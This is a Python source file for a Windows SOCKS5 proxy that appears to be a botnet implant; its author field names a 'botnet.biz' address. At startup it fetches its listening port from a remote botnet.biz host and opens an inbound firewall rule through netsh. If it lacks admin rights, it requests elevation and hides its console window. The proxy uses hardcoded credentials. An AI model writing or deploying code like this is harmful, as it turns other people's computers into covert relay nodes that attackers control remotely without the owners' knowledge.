import ctypes
import sys
import subprocess
import socket
import _thread
import time
import logging
import select
import struct
import urllib.request
from IPy import IP
from socketserver import ThreadingMixIn, TCPServer, StreamRequestHandler

__author__ = "Tomas Keske <admin@botnet.biz>"
__website__ = "https://github.com/tkeske/"

logging.basicConfig(level=logging.DEBUG)
SOCKS_VERSION = 5

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

        pass

class SocksProxy(StreamRequestHandler):
    username = 'username'
    password = 'password'

    def handle(self):
        logging.info('Accepting connection from %s:%s' % self.client_address)

        # greeting header
        # read and unpack 2 bytes from a client
        header = self.connection.recv(2)
        version, nmethods = struct.unpack("!BB", header)

        # get available methods
        methods = self.get_available_methods(nmethods)

        # accept only USERNAME/PASSWORD auth
        if 2 not in set(methods):
            # close connection
            self.server.close_request(self.request)
            return

        # send welcome message
        self.connection.sendall(struct.pack("!BB", SOCKS_VERSION, 2))

        if not self.verify_credentials():
            return

        # request
        version, cmd, _, address_type = struct.unpack("!BBBB", self.connection.recv(4))

        if address_type == 1:  # IPv4
            address = socket.inet_ntoa(self.connection.recv(4))
        elif address_type == 3:  # Domain name
            address = self.connection.recv(self.connection.recv(1)[0])

        port = struct.unpack('!H', self.connection.recv(2))[0]

        # reply
        try:
            if cmd == 1:  # CONNECT
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.connect((address, port))
                bind_address = remote.getsockname()
                logging.info('Connected to %s %s' % (address, port))
            else:
                self.server.close_request(self.request)

            addr = struct.unpack("!I", socket.inet_aton(bind_address[0]))[0]
            port = bind_address[1]
            reply = struct.pack("!BBBBIH", SOCKS_VERSION, 0, 0, address_type,
                                addr, port)

        except Exception as err:
            logging.error(err)
            # return connection refused error
            reply = self.generate_failed_reply(address_type, 5)

        self.connection.sendall(reply)

        # establish data exchange
        if reply[1] == 0 and cmd == 1:
            self.exchange_loop(self.connection, remote)

        self.server.close_request(self.request)

    def get_available_methods(self, n):
        methods = []
        for i in range(n):
            methods.append(ord(self.connection.recv(1)))
        return methods

    def verify_credentials(self):
        version = ord(self.connection.recv(1))
        assert version == 1

        username_len = ord(self.connection.recv(1))
        username = self.connection.recv(username_len).decode('utf-8')

        password_len = ord(self.connection.recv(1))
        password = self.connection.recv(password_len).decode('utf-8')

        if username == self.username and password == self.password:
            # success, status = 0
            response = struct.pack("!BB", version, 0)
            self.connection.sendall(response)
            return True

        # failure, status != 0
        response = struct.pack("!BB", version, 0xFF)
        self.connection.sendall(response)
        self.server.close_request(self.request)
        return False

    def generate_failed_reply(self, address_type, error_number):
        return struct.pack("!BBBBIH", SOCKS_VERSION, error_number, 0, address_type, 0, 0)

    def exchange_loop(self, client, remote):

        while True:

            # wait until client or remote is available for read
            r, w, e = select.select([client, remote], [], [])

            if client in r:
                data = client.recv(4096)
                if remote.send(data) <= 0:
                    break

            if remote in r:
                data = remote.recv(4096)
                if client.send(data) <= 0:
                    break

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def openFirewallPort():
        port = getPort()
        p = subprocess.Popen(["powershell.exe", 
              "netsh advfirewall firewall add rule name=\"myapp\" dir=in action=allow protocol=TCP localport="+str(port)], 
              stdout=sys.stdout)
        p.communicate()

def getPort():
    port = urllib.request.urlopen("http://ports.botnet.biz").read()
    port = int(port)

    return port

if is_admin():

        #get port from database
        port = getPort()

        #add firewall exception
        openFirewallPort()

        #run the socks5 server
        if __name__ == '__main__':
                with ThreadingTCPServer(("127.0.0.1", port), SocksProxy) as server:
                        server.serve_forever()


else:
        #re-run the program and elevate permissions to admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

        #hide console into background
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_HIDE = 0
        hWnd = kernel32.GetConsoleWindow()
        user32.ShowWindow(hWnd, SW_HIDE)